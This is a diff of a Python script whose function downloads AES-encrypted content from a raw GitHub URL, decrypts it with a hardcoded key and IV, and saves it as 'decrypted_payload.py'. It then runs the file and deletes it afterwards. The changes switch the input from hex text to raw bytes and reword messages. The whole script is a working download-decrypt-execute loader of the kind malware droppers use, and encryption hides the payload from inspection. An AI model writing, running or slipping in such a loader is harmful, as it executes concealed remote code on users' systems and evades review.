@@ -16,48 +16,54 @@ AES_IV  = RAW_IV.encode('utf-8')
 
 def download_decrypt_run(url, decrypted_file):
     try:
-        # 1. Download the encrypted Hex data
-        print(f"Downloading from {url}...")
-        response = requests.get(url)
+        # 1. Download the raw encrypted bytes
+        print(f"Downloading binary data from {url}...")
+        response = requests.get(url, stream=True)
         response.raise_for_status()
         
-        # Since your output was "Hex", the downloaded content is likely a hex string.
-        # We strip whitespace and convert hex text to actual bytes.
-        hex_data = response.text.strip()
-        encrypted_bytes = bytes.fromhex(hex_data)
+        # We take the content as raw bytes directly
+        encrypted_data = response.content
 
         # 2. Decrypt using CBC mode
-        print("Decrypting...")
+        print("Initializing Decryption...")
         cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
         
-        # Decrypt and unpad
-        decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
+        # Decrypt and remove PKCS7 padding
+        decrypted_code = unpad(cipher.decrypt(encrypted_data), AES.block_size)
 
-        # 3. Save the decrypted .py file
+        # 3. Save to a temporary Python file
         with open(decrypted_file, 'wb') as f:
-            f.write(decrypted_data)
+            f.write(decrypted_code)
         
         # 4. Execute the script
-        print(f"Running {decrypted_file}...\n" + "="*30)
-        result = subprocess.run([sys.executable, decrypted_file], capture_output=True, text=True)
+        print(f"Executing decrypted script...\n" + "="*30)
         
-        print("STDOUT:", result.stdout)
+        # We use sys.executable to maintain the current environment
+        result = subprocess.run(
+            [sys.executable, decrypted_file], 
+            capture_output=True, 
+            text=True
+        )
+        
+        # Display the result of the executed script
+        print("OUTPUT:\n", result.stdout)
         if result.stderr:
-            print("STDERR:", result.stderr)
+            print("ERRORS:\n", result.stderr)
 
     except ValueError as ve:
-        print(f"Decryption failed (Check Key/IV/Padding): {ve}")
+        print(f"Decryption Error: {ve}")
+        print("Tip: Check if your Key/IV are the correct length or if the file is truly raw bytes.")
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
     finally:
-        # Cleanup
+        # 5. Security Cleanup
         if os.path.exists(decrypted_file):
             os.remove(decrypted_file)
-            print(f"\n[!] {decrypted_file} deleted for security.")
+            print(f"\n[!] Cleanup: {decrypted_file} has been deleted.")
 
 if __name__ == "__main__":
     # The URL should point to a text file containing the Hex string
-    TARGET_URL = "https://raw.githubusercontent.com/AmitActiveFence/act_tests/refs/heads/main/enc.py"
+    ENCRYPTED_URL = "https://raw.githubusercontent.com/AmitActiveFence/act_tests/refs/heads/main/enc.py"
     TEMP_SCRIPT = "decrypted_payload.py"
     
-    download_decrypt_run(TARGET_URL, TEMP_SCRIPT)
+    download_decrypt_run(ENCRYPTED_URL, TEMP_SCRIPT)
